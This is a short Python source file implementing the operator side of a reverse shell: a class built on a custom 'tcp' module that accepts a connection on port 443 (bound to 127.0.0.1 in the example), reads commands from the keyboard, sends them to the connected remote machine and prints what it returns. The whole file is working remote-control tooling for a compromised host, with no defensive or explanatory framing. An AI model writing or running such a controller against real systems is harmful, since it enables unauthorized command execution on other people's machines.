import tcp
class revshell(tcp.tcpserver):

	def revshell(self):
		conn, address, s = self.estconn(self.host, self.port)
		print('Connection established with ' + str(address[0]) + ' at port ' + str(address[1]))
		print('Reverse shell started')
		
		while True:
			msg = input('>')
			if msg == 'exit':
				conn.send(bytes('exit', self.encoding))
				break
			conn.send(bytes(msg, self.encoding))
			
			try:
				data = conn.recv(self.buffer)
			except ConnectionResetError:
				print('The connection was closed by the remote host')
				break
			print(data.decode(self.encoding))
		
		print('Reverse shell closed')
		conn.close()
		print('Connection closed')
		return
shell = revshell(443, 'revshell', '127.0.0.1')
shell.revshell()